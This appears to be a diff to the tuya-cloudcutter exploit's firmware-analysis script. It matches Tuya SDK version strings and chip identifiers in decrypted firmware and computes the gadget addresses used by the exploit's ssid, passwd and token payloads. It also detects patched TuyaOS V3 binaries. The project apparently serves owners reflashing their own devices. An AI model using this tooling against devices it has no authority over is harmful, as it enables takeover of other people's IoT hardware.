@@ -49,6 +49,15 @@ def walk_app_code():
     if b'TUYA' not in appcode:
         raise RuntimeError('[!] App binary does not appear to be correctly decrypted, or has no Tuya references.')
 
+    # TuyaOS V3+, patched
+    if b'TuyaOS V:3' in appcode:
+        with open(name_output_file('patched.txt'), 'w') as f:
+            f.write('patched')
+        print("==============================================================================================================")
+        print("[!] The binary supplied appears to be patched and no longer vulnerable to the tuya-cloudcutter exploit.")
+        print("==============================================================================================================")
+        return
+
     # Older versions of BK7231T, BS version 30.04, SDK 2.0.0
     if b'TUYA IOT SDK V:2.0.0 BS:30.04' in appcode and b'AT 8710_2M' in appcode:
         # 04 1e 2c d1 11 9b is the byte pattern for datagram payload
@@ -96,7 +105,7 @@ def walk_app_code():
         return
 
     # Newest versions of BK7231T, BS 40.00, SDK 2.3.2
-    if b'TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
+    if b'TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode and b'AT bk7231t' in appcode:
         # 04 1e 00 d1 0c e7 is the byte pattern for ssid payload (offset 8 bytes)
         # 1 match should be found
         # bb 68 20 1c 98 47 is the byte pattern for finish address
@@ -110,7 +119,8 @@ def walk_app_code():
     if (b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
             or b'TUYA IOT SDK V:0.0.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
             or b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.3_CD:1.0.0' in appcode
-            or b'TUYA IOT SDK V:ffcgroup BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode):
+            or b'TUYA IOT SDK V:ffcgroup BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
+        ) and (b'AT bk7231n' in appcode or b'AT BK7231NL' in appcode):
         # 05 1e 00 d1 15 e7 is the byte pattern for ssid payload
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
@@ -119,7 +129,7 @@ def walk_app_code():
         return
 
     # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.4
-    if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
+    if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode and (b'AT bk7231n' in appcode or b'AT BK7231NL' in appcode):
         # 05 1e 00 d1 13 e7 is the byte pattern for ssid payload
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
@@ -128,7 +138,7 @@ def walk_app_code():
         return
 
     # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.5
-    if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.5_CD:1.0.0' in appcode:
+    if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.5_CD:1.0.0' in appcode and (b'AT bk7231n' in appcode or b'AT BK7231NL' in appcode):
         # 05 1e 00 d1 fc e6 is the byte pattern for ssid payload
         # 1 match should be found
         # 43 68 20 1c 98 47 is the byte pattern for finish address
@@ -136,17 +146,13 @@ def walk_app_code():
         process_beken("BK7231N", "SDK 2.3.3 LAN 3.4/CAD 1.0.5", "ssid", 4, "051e00d1fce6", 1, 0, "4368201c9847", 1, 0)
         return
 
-    # TuyaOS V3+, patched
-    if b'TuyaOS V:3' in appcode:
-        with open(name_output_file('patched.txt'), 'w') as f:
-            f.write('patched')
-        print("==============================================================================================================")
-        print("[!] The binary supplied appears to be patched and no longer vulnerable to the tuya-cloudcutter exploit.")
-        print("==============================================================================================================")
-        return
-    
-    if b'\x002.3.0\x00' in appcode and b'AmebaZII' in appcode:
+    # RTL8720CF, 2.3.0 SDK with no SDK string
+    if b'\x002.3.0\x00' in appcode and b'AmebaZII' in appcode and b'TUYA IOT SDK' not in appcode:
         process_rtl8720cf("RTL8720CF", "SDK 2.3.0", "ssid", 4, "2846666ab047", 1, 0, "passwd", 2, "dff83c810646", 1, 0, "044630b10068", 2, 1)
+        return
+    # RTL8720CF 2.3.0 SDK with SDK string
+    if b'TUYA IOT SDK V:2.3.0 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode and b'AT rtl8720cf_ameba' in appcode:
+        process_rtl8720cf("RTL8720CF", "SDK 2.3.0", "token", 0, "5b6820469847", 2, 1, "passwd", 4, "dff834800646", 1, 0, "d8f80080b8f1", 1, 0)
         return
 
     raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')
@@ -179,10 +185,10 @@ def find_payload(matcher, addr_size : int, type, padding, bytecode_string, count
     for b in addr.to_bytes(addr_size, byteorder='little'):
         if b == 0:
             if type == "finish" and count > 0:
-                print(f"[!] Preferred {type} address contained a null byte, using available alternative")
+                print(f"[!] Preferred {type} address ({addr:X}) contained a null byte, using available alternative")
                 addr = matcher.set_final_thumb_offset(matches[index + 1])
             else:
-                raise RuntimeError(f"[!] {type} address contains a null byte, unable to continue")
+                raise RuntimeError(f"[!] {type} address ({addr:X}) contains a null byte, unable to continue")
     print(f"[+] {type} payload address gadget (THUMB): 0x{addr:X}")
     
     with open(name_output_file(f'address_{type}.txt'), 'w') as f:
